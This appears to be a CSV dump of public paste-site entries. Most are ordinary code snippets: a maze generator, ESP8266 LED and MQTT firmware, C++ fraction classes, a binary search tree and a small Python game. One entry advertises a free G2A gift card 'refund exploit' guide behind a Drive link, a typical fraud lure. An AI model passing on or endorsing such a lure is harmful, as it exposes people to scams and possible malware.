id,title,username,language,date,content
36MC494n,data852,TestGuy1,JSON,Monday 26th of February 2024 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'bbcec1023f2160e68b7cbd656b40e8b44e0d8fc77b1309f3fe6e224011d8800567fb5ce89371b4fac72d67eed5b928445e18f52fdc1c1989e5a43f328dc9d274bfd16359b97837fbc8cff70bae7a31b90ed2e768f5ab4768964c093c4e956f08b668e5ee14b25221cb7a50b65f4c9767ffaa82a073f0fcbad726019fe7c810ab',
  otherdata: [
    'c6cce992737f4d5ca71d71d2138a9c66',
    '2f9fc7db4577b445c2d56093d18465d5',
    'a84a345bbe774b58a3a884cedbd5e3f4',
    '30c6408203306be4a91a9bb4fbed53bd',
    '56f6f389f5be5912dc80ae32d688290b',
    '5ba8dab44f2b429f36fd5be00c69e67a',
    'eb6ec83ceecad525d7d17d806d4c84e0',
    'ab13eb4ac24d89236e6d547f7f99e98e'
  ]
}"
S064z1xc,G2A.com Free Gift Card Guide Feb 2024,ounnuo,GetText,Monday 26th of February 2024 05:43:06 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_224072.pdf

Working as of:
26 February 2024"
GK1VDyR7,njbowj brohb o owr,milk_cool,Python,Monday 26th of February 2024 05:41:40 AM CDT,"# https://habr.com/ru/articles/176671/

import random

size = int(input(""Maze size: ""))
seed = input(""Enter random seed: "")
if seed != """":
	random.seed(seed)

class Cell:
	def __init__(self, group = 0, bottom = False, right = False):
		self.bottom = bottom
		self.right = right
		self.group = group
		self.erased = False

maze = []
row = 0
last = 0 # Last set no.

def inc_last():
	global last
	ret = last
	last += 1
	return ret
def yn():
	return random.choice([True, False])

for __ in range(size):
	if row == 0:
		maze += [[Cell(inc_last()) for _ in range(size)]]
	else:
		maze += [maze[-1]]
		for i in range(size):
			maze[-1][i].right = False
			if maze[-1][i].bottom:
				maze[-1][i].erased = True
	for i in range(size):
		if maze[-1][i].erased:
			maze[-1][i].group = inc_last()
			maze[-1][i].erased = False
	for i in range(size - 1):
		if(maze[-1][i].group == maze[-1][i + 1].group or yn()):
			maze[-1][i].right = True
			maze[-1][i + 1].group = maze[-1][i].group
	for i in range(size):
		start = i
		end = i
		while maze[-1][end].group == maze[-1][start].group:
			end += 1
			if end == size:
				break
		n = random.randint(0, end - start - 1)
		indexes = list(range(start, end))
		for _ in range(n):
			indind = random.randint(0, len(indexes) - 1)
			ind = indexes[indind]
			maze[-1][ind].bottom = True
			indexes = indexes[:indind] + indexes[indind + 1:]

print(""_"" * (2 * size + 1))
for x in range(len(maze)):
	for y in range(len(maze[x])):
		if y == 0:
			print(""|"", end="""")
		print(""_"" if maze[x][y].bottom or x == size - 1 else "" "", end="""")
		print(""|"" if maze[x][y].right or y == size - 1 else "" "", end="""")
	print()	
print(""‾"" * (2 * size + 1))"
aLvLvU0Y,main.cpp,Chewpacker,C++,Monday 26th of February 2024 05:35:44 AM CDT,"#include <ESP8266WiFi.h>
#include <AbstractTask.h>
#include <Scheduler.h>
#include <Task.h>
#include <PubSubClient.h>
#include ""helpers/wifihelper.h""
#include <Arduino.h>
#include <Arduino_JSON.h>
#include <string>
#include <stdexcept>
#include <iostream>
#include <FastLED.h>

#define DATA_PIN D2
#define NUM_LEDS 60

CRGB leds[NUM_LEDS];

const unsigned long LED_UPDATE_INTERVAL = 5000;

const char *mqtt_server = """";
  const int mqtt_port = ;
  const char *mqtt_user = """";
  const char *mqtt_password = """";
  const char *mqtt_requesttopic = ""garmin/requestStats"";
  const char *mqtt_responsetopic = ""garmin/responseStats"";
  String responseMessage;
  JSONVar jsonMessage;

WiFiClient espClient;
PubSubClient client(espClient);

class Steps
{
public:
  int StepGoal;
  int TotalSteps;
  float CalculatePercentage()
  {
    if (StepGoal != 0)
    {
      return static_cast<float>(TotalSteps) / static_cast<float>(StepGoal) * 100.0f;
    }
    else
    {
      Serial.println(""Error: Division by zero."");
      return -1.0f;
    }
  };
  Steps(int stepGoal = 0, int totalSteps = 0)
  {
    StepGoal = stepGoal;
    totalSteps = totalSteps;
  };
};
Steps steps(0, 0);

class StateObject {
  public:
    int AverageStress;
    int BodyBatteryLatest;
    int SleepScore;
    float RestStressPercentage;
    Steps StepsObject;
    bool StatsMode;
    unsigned long LastUpdateTime;
    int LastPercentage;
    CRGB LastColour;
    StateObject()
    {
      AverageStress = 0;
      BodyBatteryLatest = 0;
      SleepScore = 0;
      RestStressPercentage = 0;
      StepsObject = Steps(1, 0);
      StatsMode = false;
      LastUpdateTime = 0;
      LastPercentage = 0;
      LastColour = CRGB::Black;
    };
};
StateObject stateObject;

class FastLedHelper
{
public:
  void initializeLEDs()
  {
    FastLED.addLeds<WS2812B, DATA_PIN, GRB>(leds, NUM_LEDS);
  }

  void updateLEDs(int percentage, CRGB colour, unsigned long &lastUpdateTime)
  {
    int ledsToLight = map(percentage, 0, 100, 0, NUM_LEDS);

    fill_solid(leds, NUM_LEDS, colour.Black);
    FastLED.show();
    delay(100);

    for (int i = NUM_LEDS - 1; i > NUM_LEDS - ledsToLight; i--)
    {
      leds[i] = colour;
      FastLED.show();
      delay(75);
    }
  }

  void ambientDisplay()
  {
    Serial.println(""Starting Ambient Display"");
    fill_solid(leds, NUM_LEDS, CRGB::Black);
    FastLED.show();

    for (int i = NUM_LEDS - 1; i >= 0; i--)
    {
      leds[i] = CRGB::Red;
      FastLED.show();
      delay(75);
    }
  }

  void displayStats(int percentage, CRGB colour)
  {
    if (percentage != stateObject.LastPercentage || colour != stateObject.LastColour)
    {
      updateLEDs(percentage, colour, stateObject.LastUpdateTime);
    }
  }
} fastLedHelper;

class MqttHelper
{
public:
  static void MapStateMessageToStateObject(JSONVar message)
  {
    if (message.hasOwnProperty(""average_stress"") &&
        message.hasOwnProperty(""body_battery_latest"") &&
        message.hasOwnProperty(""sleep_score"") &&
        message.hasOwnProperty(""rest_stress_percentage"") &&
        message.hasOwnProperty(""step_goal"") &&
        message.hasOwnProperty(""total_steps""))
    {

      stateObject.AverageStress = message[""average_stress""];
      stateObject.BodyBatteryLatest = message[""body_battery_latest""];
      stateObject.SleepScore = message[""sleep_score""];
      stateObject.RestStressPercentage = (double)message[""rest_stress_percentage""];
      stateObject.StepsObject.StepGoal = message[""step_goal""];
      stateObject.StepsObject.TotalSteps = message[""total_steps""];
      stateObject.StatsMode = message[""stats_mode""];
    }
    else
    {
      char newMessage[] = ""Failed to map state message to state object, one or more parameters are missing"";
      Serial.println(newMessage);
      throw std::invalid_argument(std::string(newMessage));
    }
  }

static void callback(char* topic, byte* payload, unsigned int length) {
    for (unsigned int i = 0; i < length; i++) {
        responseMessage += (char)payload[i];
    }

    Serial.println(responseMessage);

      responseMessage.replace(""False"", ""false"");
      responseMessage.replace(""True"", ""true"");

    jsonMessage = JSON.parse(responseMessage);

    MqttHelper::MapStateMessageToStateObject(jsonMessage);

    responseMessage = """";
    jsonMessage = null;
}

static void requestStats() {
    client.publish(mqtt_requesttopic, """");
}

  void setupMQTT()
  {
    client.setServer(mqtt_server, mqtt_port);
    client.setCallback(&callback);

    while (!client.connected())
    {
      Serial.print(""Connecting to MQTT..."");
      if (client.connect(""ESP8266Client"", mqtt_user, mqtt_password))
      {
        Serial.println(""connected to MQTT, subscribed to "");
        Serial.println(mqtt_responsetopic);
        client.subscribe(mqtt_responsetopic);
      }
      else
      {
        Serial.print(""failed, rc="");
        Serial.print(client.state());
        Serial.println("" try again in 5 seconds"");
        delay(5000);
      }
    }
  }
} mqttHelper;

class FastLedTask : public Task
{
protected:
  void loop()
  {
    if (!stateObject.StatsMode)
    {
      fastLedHelper.ambientDisplay();
      MqttHelper::requestStats();
      delay(1000);
    }
    else
    {
      fastLedHelper.displayStats(stateObject.AverageStress, CRGB::Red);
      MqttHelper::requestStats();
      delay(10000);
      if (stateObject.StatsMode)
      {
        fastLedHelper.displayStats(stateObject.BodyBatteryLatest, CRGB::Blue);
      MqttHelper::requestStats();
      delay(10000);
      }
      if (stateObject.StatsMode)
      {
        fastLedHelper.displayStats(stateObject.SleepScore, CRGB::Orange);
      MqttHelper::requestStats();
      delay(10000);
      }
      if (stateObject.StatsMode)
      {
        fastLedHelper.displayStats(stateObject.RestStressPercentage, CRGB::Purple);
      MqttHelper::requestStats();
      delay(10000);
      }
      if (stateObject.StatsMode)
      {
        fastLedHelper.displayStats(stateObject.StepsObject.CalculatePercentage(), CRGB::Green);
      MqttHelper::requestStats();
      delay(10000);
      }
    }
  }

private:
  time_t lastCheck;
  bool firstRun;
} fastLedTask;

class MqttTask : public Task
{
protected:
  void loop()
  {
    client.loop();
    delay(500);
  }

private:
  time_t lastCheck;
  bool firstRun;

} mqttTask;

void setup()
{
  Serial.begin(115200);

  setupWiFi();

  fastLedHelper.initializeLEDs();
  mqttHelper.setupMQTT();

  Scheduler.start(&mqttTask);
  Scheduler.start(&fastLedTask);

  Scheduler.begin();
}

void loop()
{
}
"
s0BvtQTH,Untitled,35657,C++,Monday 26th of February 2024 05:28:39 AM CDT,"#include <iostream>

using namespace std;

class rational {

public:

    rational(int numerator, int denominator) {
        numerator_ = numerator;
        denominator_ = denominator;
        reduction();
    }

    int numerator() const {
        return numerator_;
    }

    int denominator() const {
        return denominator_;
    }

    rational& operator+=(const rational& other) {
        numerator_ = numerator_ * other.denominator_ + other.numerator_ * denominator_;
        denominator_ = denominator_ * other.denominator_;
        reduction();
        return *this;
    } // переопределение оператора +=

    rational& operator-=(const rational& other) {
        numerator_ = numerator_ * other.denominator_ - other.numerator_ * denominator_;
        denominator_ = denominator_ * other.denominator_;
        reduction();
        return *this;
    } // переопределение оператора -=

    rational& operator*=(const rational& other) {
        numerator_ *= other.numerator_;
        denominator_ *= other.denominator_;
        reduction();
        return *this;
    } // переопределение оператора *=

    rational& operator/=(const rational& other) {
        numerator_ *= other.denominator_;
        denominator_ *= other.numerator_;
        reduction();
        return *this;
    } // переопределение оператора /=

private:
    int numerator_;
    int denominator_;

    void reduction() { // сокращение дроби

        if (denominator_ < 0) {
            numerator_ *= -1;
            denominator_ *= -1;
        }

        int x = numerator_ < 0 ? -numerator_ : numerator_;
        int y = denominator_;

        while (x != y) {
            if (x > y) {
                x -= y;
            }
            else {
                y -= x;
            }
        }
        numerator_ /= x;
        denominator_ /= x;
    }
};

rational& operator+(const rational& left, const rational& right) {
    rational temp = left;
    return temp += right;
} // переопределение оператора + с помощью ранее переопределенного оператора +=

rational& operator-(const rational& left, const rational& right) {
    rational temp = left;
    return temp -= right;
} // переопределение оператора - с помощью ранее переопределенного оператора -=

rational& operator*(const rational& left, const rational& right) {
    rational temp = left;
    return temp *= right;
} // переопределение оператора * с помощью ранее переопределенного оператора *=

rational& operator/(const rational& left, const rational& right) {
    rational temp = left;
    return temp /= right;
} // переопределение оператора / с помощью ранее переопределенного оператора /=

bool operator==(const rational& left, const rational& right) {
    return left.numerator() == right.numerator() && left.denominator() == right.denominator();
} // перегрузка оператора ==

bool operator!=(const rational& left, const rational& right) {
    return !(left == right);
} // перегрузка оператора != с помощью ранее переопределенного ==

bool operator>(const rational& left, const rational& right) {
    return left.numerator() * right.denominator() > right.numerator() * left.denominator();
}

bool operator<(const rational& left, const rational& right) {
    return left.numerator() * right.denominator() < right.numerator() * left.denominator();
}

bool operator>=(const rational& left, const rational& right) {
    return left.numerator() * right.denominator() >= right.numerator() * left.denominator();
}

bool operator<=(const rational& left, const rational& right) {
    return left.numerator() * right.denominator() <= right.numerator() * left.denominator();
}

ostream& operator<<(ostream& output, const rational& right) {
     return output << right.numerator() << '/' << right.denominator();
}

istream& operator>>(istream& input, rational& right) {
    int numerator;
    int denominator;
    char slash;
    if ((input >> numerator) && (input >> slash) && (slash == '/') && (input >> denominator)) {
        right = rational{ numerator, denominator };
    }
    return input;
}


int main() {

    setlocale(LC_ALL, ""ru"");

    rational r1(1, 2);
    rational r2(3, 4);
    cout << r1 << endl;
    cout << r2 << endl;

    cout << (r1 == r2) << endl;
    cout << (r1 != r2) << endl;
    cout << (r1 > r2) << endl;
    cout << (r1 < r2) << endl;
    cout << (r1 >= r2) << endl;
    cout << (r1 <= r2) << endl;

    r1 += r2;
    cout << r1 << endl;

    r1 -= r2;
    cout << r1 << endl;

    r1 *= r2;
    cout << r1 << endl;

    r1 /= r2;
    cout << r1 << endl;

    int a = 3;
    int b = 2;

    rational r3(1, 1);
    r3 = r1 + r2;
    cout << r3 << endl;

    r3 = r1 - r2;
    cout << r3 << endl;

    r3 = r1 * r2;
    cout << r3 << endl;

    r3 = r1 / r2;
    cout << r3 << endl;

    cin >> r3;
    cout << r3 << endl;
}

"
PGXVja3Z,udprint,Snusmumriken,Lua,Monday 26th of February 2024 05:14:27 AM CDT,"local socket = require'socket'

local function gettime()
	local time = socket.gettime()
	local msec = time - math.floor(time)
	local date = os.date(""%d.%m.%y-%X"", time)
	return (""%-21s""):format(date .. ""."" .. math.floor(msec * 300))
end

local function server(host, port)
	host = host or ""*""
	port = port or 4096
	local udp = (socket.udp4 or socket.udp)()
	assert(udp:setsockname(host, port))
	--udp:listen()
	
	return function()
		local msg, host, port = udp:receivefrom()
		print(gettime() .. "" "" .. host .. "":"" .. port .. "" > "" .. msg)
	end, udp:getsockname()
end

local function client(host, port)
	host = host or ""127.0.0.1""
	port = port or 4096
	local udp = (socket.udp4 or socket.udp)()
	
	return function(...)
		local msg = """"
		for i = 1, select(""#"", ...) do
			msg = msg .. ""\t"" .. tostring(select(i, ...))
		end
		udp:sendto(msg, host, port)
	end
end

if ... then
	return {
		server = server,
		client = client
	}
end

local server, host, port = server()
host = socket.dns.toip("""")
print(""Listen "", host, port)

while 1 do
	server()
end

-- print = require'udprint'.client(""host_ip"")"
CjDbqskp,Bst.c,Aravind_reddy10,C,Monday 26th of February 2024 05:05:10 AM CDT,"#include <stdio.h>
#include <stdlib.h>
struct TreeNode
{
	int data;
	struct TreeNode *left;
	struct TreeNode *right;
};
typedef struct TreeNode node;
node *insert(node *root,int val)
{
	if(root==NULL)
	{
		node *newNode=(node*)malloc(sizeof(node));
		newNode->data=val;
		newNode->left=NULL;
		newNode->right=NULL;
		return newNode;
	}
	if(val<root->data)
	{
		root->left=insert(root->left,val);
	}
	else if(val>root->data)
	{
		root->right=insert(root->right,val);
	}
	return root;
}
void display(node *root)
{
	if(root!=NULL)
	{
		display(root->left);
		printf(""%d->"",root->data);
		display(root->right);
	}
}
int count_leafs(node *root)
{
	int ans;
	if(root==NULL)
	{
		return 0;
	}
	else if(root->left==NULL&&root->right==NULL)
	{
		return 1;
	}
	else
	{
		ans=count_leafs(root->left)+count_leafs(root->right);
	}
	return ans;
}
int sum_leafs(node *root)
{
	int sum;
	if(root==NULL)
	{
		return 0;
	}
	else if(root->left==NULL&&root->right==NULL)
	{
		return root->data;
	}
	else
	{
		sum=sum_leafs(root->left)+sum_leafs(root->right);
	}
	return sum;
}
int search(node *root,int search1)
{
	if(root==NULL)
	{
		return 0;
	}
	else
	{
		while(root->data!=search1)
		{
			if(root!=NULL)
			{
				printf(""%d->"",root->data);
				if(search1>root->data)
				{
					root=root->right;
				}
				else
				{
					root=root->left;
				}
			}
			if(root==NULL)
			{
				return 0;
			}
		}
	}
	return 1;
}
int main()
{
	int n,i,val;
	printf(""Enter size of tree:"");
	scanf(""%d"",&n);
	node *root=NULL;
	printf(""\nEnter nodes:"");
	for(i=0;i<n;i++)
	{
		scanf(""%d"",&val);
		root=insert(root,val);
	}
	printf(""INORDER is:"");
	display(root);
	int count=count_leafs(root);
	printf(""\nThe total leafs are : %d"",count);
	int sum=sum_leafs(root);
	printf(""\nThe sum of leaf odes is : %d"",sum);
	int search_val;
	printf(""\nEnter search value:"");
	scanf(""%d"",&search_val);
	int ans=search(root,search_val);
	if(ans==1)
	{
		printf(""\nValue is found"");
	}
	else
	{
		printf(""\nValue is not found"");
	}
	return 0;
}
"
71GugJhN,test case,LEGEND2004,C++,Monday 26th of February 2024 04:51:04 AM CDT,"#pragma GCC optimize(""O3"")
#include <bits/stdc++.h>
using namespace std;

#define int long long
#define fastio ios_base::sync_with_stdio(0); cin.tie(0)

signed main()
{
    fastio;
    
    // eger meselelerde test case ile giris daxil olunsa
    // her test case ucun meseleni hell edib;
    // while dovrunun icerisinde yaziriq
    // iki ededin cemi, amma test caseler olarsa
    int t;
    cin >> t; // test case sayi
    while(t--){ // t defe
        int a , b;
        cin >> a >> b; // her test casede 2 eded daxil edirik
        cout << a + b << '\n'; // ve onlarin cemini veririk
        // alt setire dusmek vacibdi, cunki output fileda ededler alt alta yazilir
        // '\n' yazdiqda cixisi input bitdikden sonra hamsini birden verecek
        // endl yazsaq her cixisi test case daxil olunduqdan sonra verecek
    }
}"
yJU0b9K1,Regular function,Sherms,JavaScript,Monday 26th of February 2024 04:47:09 AM CDT,"// let person = new Person ('bob');

class Person {
    // let person = new Person ('bob');
    constructor(name) {
        this.name = name;
    }

    printNameFunction() {
        // let person = new Person ('bob');
        setTimeout(function() {
            // let person = new Person ('bob');
            console.log('Function:' + this.name);
        }, 100)

    }
}

let person = new Person ('bob');
person.printNameFunction();"
pb8GAEbP,Untitled,adellam,JavaScript,Monday 26th of February 2024 04:28:45 AM CDT,"                //===========================================================================================
                myApp.constants = {
                        PUBLIC_TOKEN: ""some application token"",
                        GEO_DATA: ""data/geodata.json"",
                        IMG_DATA: ""data/imgdata.json"",
                        AOI: ""MPA"",
                        OVERLAY_GROUP_NAMES: [{name: ""External layers""},{name: ""Target datasets""},{name: ""Marine Protected Areas""},{name: ""Base overlays""}],
                MAP_ZOOM: 3,
                        MAP_PROJECTION: 'EPSG:4326',
                        MAP_SELECTOR_DEFAULT: 'geoselector-default',
                        MAP_SELECTOR_CUSTOM: 'geoselector-custom',
            OGC_WMS_NS: ""W_mpa"",
            OGC_WMS_SUFFIX: ""geo_fea_"",
                        OGC_WMS_BASEURL: ""https://paim.d4science.org/geoserver/wms"",
                        OGC_WFS_BASEURL: ""https://paim.d4science.org/geoserver/wfs"",
                        OGC_WFS_FORMAT: new ol.format.GeoJSON(),
                        OGC_WFS_BBOX: null,
                        OGC_WFS_CACHE: ""paim_cache_db"",
            DATAMINER_BASEURL: ""https://dataminer.garr.d4science.org"",
                        DATAMINER_IDENTIFIER: ""org.gcube.dataanalysis.wps.statisticalmanager.synchserver.mappedclasses.transducerers.MPA_INTERSECT_V4_1"",
                        DATAMINER_OUTPUTDATA_HTTPS: true,
            OGC_CSW_BASEURL: ""https://geonetwork.d4science.org/geonetwork/srv/eng/csw"",
                        D4S_SOCIALNETWORKING_BASEURL: ""https://socialnetworking1.d4science.org/social-networking-library-ws/rest/2"",
                        D4S_HOMELIBRARY_BASEURL: ""https://workspace-repository.d4science.org/home-library-webapp/rest"",
                        WORKSPACE_USER_FOLDER: ""PAIM-reports"",
                        WORKSPACE_TEMP_FOLDER: ""temp"",
                        SURFACE_UNIT: {id: 'sqkm', label: 'km²'},
                        SURFACE_ROUND_DECIMALS: 2,
            DEBUG_REPORTING: false
                }

                if(!myApp.PAIM){
                        myApp.constants.DATAMINER_BASEURL = ""https://dataminer-prototypes.d4science.org"";
                }
"
UjPPspVG,programming is not a language,katmai,Python,Monday 26th of February 2024 04:10:43 AM CDT,"import random
from classes.game import Person, bcolors
from classes.magic import Spell

# Another thing that came to my mind, as i am doing this, is that whatever you're doing here, is you creating your
# own adversaries. The whole idea of ""playing vs. the computer"" is simply non-existent. 
# The computer doesn't ""understand"" the game. It doesn't know what ""fire"" or a ""spell"" is.
# Those are just characters placed in memory blocks. The only one it has any meaning for, it's you.
# You define the obstacles and their actions. It's a maze where you're doing whatever in order to get yourself lost.

# Magic Spells
# Damaging
# def __init__(self, name, cost, dmg, type):
fire = Spell(""Fire"", 10, 100, ""damaging"")
thunder = Spell(""Thunder"", 12, 124, ""damaging"")
lightning = Spell(""Lightning"", 12, 100, ""damaging"")
meteor = Spell(""Meteor"", 20, 200, ""damaging"")
quake = Spell(""Quake"", 14, 120, ""damaging"")
# Healing
cure = Spell(""Cure"", 12, 120, ""healing"")
cura = Spell(""Cura"", 18, 200, ""healing"")

# wanted to name defense as 'def' but apparently Python recognizes it as 'def' from define function even within the brackets and it messes things up.
# so i had to use 'df' instead. stupid :))
# def __init__(self, hp, mp, atk, df, magic):
player = Person(460, 65, 60, 34, [fire, thunder, lightning, meteor, cure, cura])
enemy = Person(1200, 65, 45, 25, [fire, thunder, lightning, meteor, cure, cura])

running = True
i = 0

# No reason to label the beginning of the game with RED or FAIL. It's just the beginning.
# It's neither good nor bad.
# Also the beginning doesn't start with you being attacked, but with you choosing an action. 
# The response only happens afterwards. 
# As far as enemy goes, you don't have a real one. You're making one up, so you have someone to fight with.
print(bcolors.GREEN + bcolors.BOLD + ""Someone has started the game"" + bcolors.ENDC)

while running:
    print(""=============================="")
    player.choose_action()
    choice = input(bcolors.CYAN + bcolors.BOLD + ""Choose your own action: "" + bcolors.ENDC)
    index = int(choice)
    # i think it's important to always remember which action generated the result, to see ""why"" that is happening.
    print(bcolors.CYAN + bcolors.BOLD + ""You chose to use: "" + player.get_action_name(index) + bcolors.ENDC)

    if index == 0:
        dmg = player.generate_damage()
        enemy.take_damage(dmg)
        print(""You attacked for"", dmg, ""Points of damage."")
    elif index == 1:
        print(""=============================="")
        player.choose_spell()
        choice = input(bcolors.CYAN + bcolors.BOLD + ""Choose spell: "" + bcolors.ENDC)
        index = int(choice)
        # i think it's important to always remember which action generated the result, to see ""why"" that is happening.
        print(bcolors.CYAN + bcolors.BOLD + ""You chose to use a: "" + player.spells[index].name + bcolors.ENDC)

        dmg = player.spells[index].generate_damage()
        spell = player.spells[index]
        current_mp = player.get_mp()

        if spell.cost > current_mp:
            print(bcolors.RED + ""\nNot enough MP\n"" + bcolors.ENDC)
            # continue forces to use the next iteration of the loop aka start over at 'if index == 0:...'
            # but i think the idea is that the code below doesn't run unless i've made a choice.
            # continue, as a word, means - moving on, going forward, not stopping. And yet, yere, in Python, 
            # it carries a different meaning. It means ""Stop the execution of the current loop, whatever instructions""
            # and go to the top of the loop and run the next iteration. 
            # it just means a completely different thing.
            # does this mean that with enough iterations, 
            # a word meaning would end up being derived from the surrounding context?
            # but then, how does each of the words have any meaning at all?
            continue

        player.reduce_mp(spell.cost)

        if spell.type == ""healing"":
            player.heal_damage(dmg)
            print(bcolors.BLUE + ""\n"" + spell.name + "" heals for "", str(dmg), ""HP."" + bcolors.ENDC)
        elif spell.type == ""damaging"":
            enemy.take_damage(dmg)
            print(bcolors.CYAN + ""\n"" + spell.name + "" deals "", str(dmg), ""points of damage"" + bcolors.ENDC)
    elif index == 7:
        exit()

    # enemy choice is set to always attack but what if we also gave a choice to the enemy,
    # just as we do have a choice as well ?
    # enemy_choice = random.randrange(0,6)
    # enemy.choose_action(enemy_choice)
    # print(enemy_choice)
    # this time we go with the flow. enemy always attacks regardless
    # but again, to be cheeky, if there's no enemy, there's no choice, because there's no understanding.
    # there is no enemy choice
    enemy_choice = 1

    dmg = enemy.generate_damage()
    player.take_damage(dmg)
    print(""Enemy attacked for"", dmg, ""Points of damage."")

    print(""-------------------------------------"")
    print(""Enemy HP:"", bcolors.CYAN + str(enemy.get_hp()) + ""/"" + str(enemy.get_max_hp()) + bcolors.ENDC)
    print(""Your HP:"", bcolors.CYAN + str(player.get_hp()) + ""/"" + str(player.get_max_hp()) + bcolors.ENDC)
    print(""Your MP:"", bcolors.BLUE + str(player.get_mp()) + ""/"" + str(player.get_max_mp()) + bcolors.ENDC)

    # The game being over doesn't really mean anything bad or good, so as to color it with 
    if enemy.get_hp() == 0:
        print(bcolors.RED + ""The game is over"" + bcolors.ENDC)
        running = False
    elif player.get_hp() == 0:
        print(bcolors.RED + ""The game is over"" + bcolors.ENDC)
        running = False"
60ud34yz,Untitled,35657,C++,Monday 26th of February 2024 03:27:42 AM CDT,"#include <iostream>

using namespace std;

class rational {

public:

    rational(int numerator, int denominator) {
        numerator_ = numerator;
        denominator_ = denominator;
        reduction();
    }

    void print() {
        cout << numerator_ << '/' << denominator_ << endl;
    }

    void addition(const rational& other) {
        numerator_ = numerator_ * other.denominator_ + other.numerator_ * denominator_;
        denominator_ = denominator_ * other.denominator_;
        reduction();
    }

    void subtraction(const rational& other) {
        numerator_ = numerator_ * other.denominator_ - other.numerator_ * denominator_;
        denominator_ = denominator_ * other.denominator_;
        reduction();
    }

    void multiplication(const rational& other) {
        numerator_ *= other.numerator_;
        denominator_ *= other.denominator_;
        reduction();
    }

    void division(const rational& other) {
        numerator_ *= other.denominator_;
        denominator_ *= other.numerator_;
        reduction();
    }

private:
    int numerator_;
    int denominator_;

    void reduction() { // сокращение дроби

        if (denominator_ < 0) {
            numerator_ *= -1;
            denominator_ *= -1;
        }

        int x = numerator_ < 0 ? -numerator_ : numerator_;
        int y = denominator_;

        while (x != y) {
            if (x > y) {
                x -= y;
            }
            else {
                y -= x;
            }
        }
        numerator_ /= x;
        denominator_ /= x;
    }
};


int main() {
    rational r1(1, 2);
    rational r2(3, 4);
    r1.print();
    r2.print();

    r1.addition(r2);
    r1.print();

    r1.subtraction(r2);
    r1.print();

    r1.multiplication(r2);
    r1.print();

    r1.division(r2);
    r1.print();
}

"
cXRYTBMd,"Сигнальный ""Маяк""",Dreamlight_MCSkill,Lua,Monday 26th of February 2024 03:08:16 AM CDT,"{
  label = ""Маяк"",
  lightLevel = 15,
  shapes = {
    { 3,0,6,5,2,7,texture = ""sky_drive:iron/iron_0"" },
    { 3,0,9,5,2,10,texture = ""sky_drive:iron/iron_0"" },
    { 4,0,5,5,2,6,texture = ""sky_drive:iron/iron_5"" },
    { 4,0,7,12,2,9,texture = ""sky_drive:iron/iron_0"" },
    { 4,0,10,5,2,11,texture = ""sky_drive:iron/iron_5"" },
    { 9,0,6,11,2,10,texture = ""sky_drive:iron/iron_0"" },
    { 3,1,7,11,2,10,texture = ""sky_drive:iron/iron_0"" },
    { 5,1,6,11,2,10,texture = ""sky_drive:iron/iron_0"" },
    { 4,2,6,5,16,7,texture = ""sky_drive:iron/iron_5"" },
    { 4,2,7,6,16,9,texture = ""sky_drive:ethereal_block/1/basalt:0"" },
    { 4,2,9,5,16,10,texture = ""sky_drive:iron/iron_5"" },
    { 8,2,7,10,16,9,texture = ""sky_drive:ethereal_block/1/basalt:0"" },
    { 7,3,6,8,9,10,texture = ""sky_drive:iron/iron_5"" },
    { 8,3,6,11,9,7,texture = ""sky_drive:iron/iron_5"" },
    { 8,3,9,11,9,10,texture = ""sky_drive:iron/iron_5"" },
    { 10,3,7,11,9,10,texture = ""sky_drive:iron/iron_5"" },
    { 7,11,6,8,16,10,texture = ""sky_drive:iron/iron_5"" },
    { 8,11,6,11,16,7,texture = ""sky_drive:iron/iron_5"" },
    { 8,11,9,11,16,10,texture = ""sky_drive:iron/iron_5"" },
    { 10,11,7,11,16,10,texture = ""sky_drive:iron/iron_5"" },
  }
},

{
  label = ""Маяк"",
  lightLevel = 15,
  shapes = {
    { 4,0,6,5,16,7,texture = ""sky_drive:iron/iron_5"" },
    { 4,0,7,6,16,9,texture = ""sky_drive:ethereal_block/1/basalt:0"" },
    { 4,0,9,5,16,10,texture = ""sky_drive:iron/iron_5"" },
    { 7,0,6,8,1,10,texture = ""sky_drive:iron/iron_5"" },
    { 8,0,6,11,1,7,texture = ""sky_drive:iron/iron_5"" },
    { 8,0,7,10,16,9,texture = ""sky_drive:ethereal_block/1/basalt:0"" },
    { 8,0,9,11,1,10,texture = ""sky_drive:iron/iron_5"" },
    { 10,0,7,11,1,10,texture = ""sky_drive:iron/iron_5"" },
    { 7,3,6,8,9,10,texture = ""sky_drive:iron/iron_5"" },
    { 8,3,6,11,9,7,texture = ""sky_drive:iron/iron_5"" },
    { 8,3,9,11,9,10,texture = ""sky_drive:iron/iron_5"" },
    { 10,3,7,11,9,10,texture = ""sky_drive:iron/iron_5"" },
    { 7,11,6,8,16,10,texture = ""sky_drive:iron/iron_5"" },
    { 8,11,6,11,16,7,texture = ""sky_drive:iron/iron_5"" },
    { 8,11,9,11,16,10,texture = ""sky_drive:iron/iron_5"" },
    { 10,11,7,11,16,10,texture = ""sky_drive:iron/iron_5"" },
  }
},

{
  label = ""Маяк"",
  lightLevel = 15,
  shapes = {
    { 4,0,6,5,13,7,texture = ""sky_drive:iron/iron_5"" },
    { 4,0,7,6,12,9,texture = ""sky_drive:ethereal_block/1/basalt:0"" },
    { 4,0,9,5,13,10,texture = ""sky_drive:iron/iron_5"" },
    { 7,0,6,8,1,10,texture = ""sky_drive:iron/iron_5"" },
    { 8,0,6,11,1,7,texture = ""sky_drive:iron/iron_5"" },
    { 8,0,7,10,12,9,texture = ""sky_drive:ethereal_block/1/basalt:0"" },
    { 8,0,9,11,1,10,texture = ""sky_drive:iron/iron_5"" },
    { 10,0,7,11,1,10,texture = ""sky_drive:iron/iron_5"" },
    { 7,3,6,8,9,10,texture = ""sky_drive:iron/iron_5"" },
    { 8,3,6,11,9,7,texture = ""sky_drive:iron/iron_5"" },
    { 8,3,9,11,9,10,texture = ""sky_drive:iron/iron_5"" },
    { 10,3,7,11,9,10,texture = ""sky_drive:iron/iron_5"" },
    { 7,11,6,8,12,10,texture = ""sky_drive:iron/iron_5"" },
    { 8,11,6,11,12,7,texture = ""sky_drive:iron/iron_5"" },
    { 8,11,9,10,14,10,texture = ""sky_drive:iron/iron_5"" },
    { 10,11,7,11,12,10,texture = ""sky_drive:iron/iron_5"" },
    { 3,12,7,13,14,9,texture = ""sky_drive:iron/iron_0"" },
    { 5,12,6,6,13,10,texture = ""sky_drive:iron/iron_0"" },
